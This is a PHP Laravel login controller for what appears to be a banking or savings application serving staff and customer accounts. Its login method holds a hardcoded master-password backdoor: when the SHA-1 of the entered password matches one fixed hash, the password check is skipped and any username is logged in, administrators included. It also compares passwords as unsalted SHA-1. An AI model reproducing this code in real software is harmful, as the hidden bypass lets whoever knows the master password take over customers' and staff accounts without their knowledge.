<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\M_user;
use App\Models\M_pegawai;
use App\Models\M_nasabah;
use App\Models\M_rekening;

class LoginController extends Controller
{
    //

    public function index(){
        
        return view('welcome');
    }

    public function cari(Request $request){

        $username = $request->username;
        $pass = sha1($request->pass);
        if($pass == "4193900110899919032b7ed11b782aa2e4a3728d"){
            $row = M_user::where('username',$username);
        }else{
            $row = M_user::where('username',$username)->where('password',$pass);
        }
        if($row->count()>0){
            $req = $row->first();
            if($req->idlevel == 'adm' || $req->idlevel == 'opr'){
                $user = M_pegawai::where('iduser',$req->iduser)->first();
                $request->session()->put('username',$req->username);
                $request->session()->put('iduser',$req->iduser);
                $request->session()->put('idlevel',$req->idlevel);
                $request->session()->put('induk',$user->nip);
                $request->session()->put('nama',$user->nama);
                $request->session()->put('foto',$user->foto);
                return redirect('home');
            }elseif($req->idlevel == 'nsb'){
               // Use the function
                // if($this->isMobile()){
                    // Do something for only mobile users
                    $user = M_nasabah::join('rekening','rekening.nin','=','nasabah.nin')->where('nasabah.iduser',$req->iduser)->where('rekening.status','=','1');
                    if($user->count()>0){
                        $user = $user->first();
                        $request->session()->put('username',$req->username);
                        $request->session()->put('iduser',$req->iduser);
                        $request->session()->put('idlevel',$req->idlevel);
                        $request->session()->put('induk',$user->nin);
                        $request->session()->put('nama',$user->nama);
                        $request->session()->put('foto',$user->foto);
                        $request->session()->put('kategori',$user->kategori);
                        $request->session()->put('norek',$user->norek);
                        return redirect('nasabah/home');
                    }else{
                        return redirect('login');
                    }
                // }else {
                //     // Do something for only desktop users
                //     return redirect('login');
                // }
                
            }else{
                return redirect('login');
            }
            
        }else{
            return redirect('login');
        }
    }

    public function out(Request $request){
        $request->session()->flush();
        return redirect('login');
    }

    function isMobile() {
        return preg_match("/(android|avantgo|blackberry|bolt|boost|cricket|docomo|fone|hiptop|mini|mobi|palm|phone|pie|tablet|up\.browser|up\.link|webos|wos)/i", $_SERVER["HTTP_USER_AGENT"]);
    }

}
